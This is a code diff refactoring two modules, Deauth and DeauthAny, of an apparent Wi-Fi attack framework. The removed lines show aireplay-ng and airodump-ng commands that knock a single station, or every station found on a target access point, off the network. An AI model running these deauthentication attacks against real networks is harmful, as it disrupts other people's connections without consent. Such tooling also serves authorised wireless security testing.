@@ -2,41 +2,48 @@
 from lib.wifi import *
 
 
-class Deauth(WifiAttackModule):
+class Deauth(WifiAttackModule, DeauthMixin):
     """ Deauthenticate the target station connected to the given BSSID given its
          MAC address.
     
     Author:  Yannick Pasquazzo
-    Version: 1.0
+    Version: 1.1
     """
     config = Config({
         Option(
             'STATION',
             "Target station's MAC address",
             True,
+            choices=lambda o: o.state['TARGETS'] \
+                              [o.config.option('ESSID').value]['stations'],
             validate=lambda s, v: re.match(r"(?:[0-9A-F]{2}\:){5}[0-9A-F]{2}", \
                                            v) is not None,
         ): None,
     })
     requirements = {'system': ["aircrack-ng/aireplay-ng"]}
     
+    def preload(self):
+        super(Deauth, self).preload()
+        stations = self.config.option('STATION').choices
+        essid = self.config.option('ESSID').value
+        if len(stations) == 0:
+            self.logger.warning("No station connec ; please use the "
+                                "'scan' command".format(essid))
+            return False
+        self.config['STATION'] = stations[0]
+    
     def run(self):
         t = self.console.state['TARGETS']
-        bssid = t[self.config.option('ESSID').value]['bssid']
-        sta = self.config.option('STATION').value
-        _ = [i for i, mon in self.console.state['INTERFACES'].items() if mon]
-        mon_if = _[0]
-        self.logger.warning("Deauth station: {}".format(sta))
-        cmd = "sudo aireplay-ng -0 5 -a {} -c {} {}".format(bssid, sta, mon_if)
-        self.console._jobs.run(cmd)
+        self.deauth(t[self.config.option('ESSID').value]['bssid'],
+                    self.config.option('STATION').value)
 
 
-class DeauthAny(WifiAttackModule):
+class DeauthAny(WifiAttackModule, DeauthMixin):
     """ Deauthenticate any target found connectect to the given BSSID on the
          given channel.
     
     Author:  Yannick Pasquazzo
-    Version: 1.0
+    Version: 1.1
     """
     config = Config({
         Option(
@@ -50,24 +57,5 @@ class DeauthAny(WifiAttackModule):
     def run(self):
         self.logger.warning("Press Ctrl+C to interrupt")
         t = self.console.state['TARGETS']
-        _ = t[self.config.option('ESSID').value]
-        bssid, ch = _['bssid'], _['channel']
-        deauth_int = self.config.option('DEAUTH_INTERVAL').value
-        _ = [i for i, mon in self.console.state['INTERFACES'].items() if mon]
-        mon_if = _[0]
-        cmd = "sudo airodump-ng -c {} --bssid {} {}".format(ch, bssid, mon_if)
-        tr = {}
-        # capture packets on the target BSSID
-        for line in self.console._jobs.run_iter(cmd):
-            self.logger.debug(line)
-            _ = STATION_REGEX.search(line)
-            # deauthenticate any station found
-            if _ is not None:
-                station = _.group("station")
-                tr.setdefault(station, 0)
-                if time() - tr[station] > deauth_int:
-                    self.logger.warning("Deauth station: {}".format(station))
-                    c = "sudo aireplay-ng -0 5 -a {} -c {} {}" \
-                        .format(bssid, station, mon_if)
-                    self.console._jobs.process(c).wait()
-                    tr[station] = time()
+        self.deauth(t[self.config.option('ESSID').value]['bssid'],
+                    interval=self.config.option('DEAUTH_INTERVAL').value)
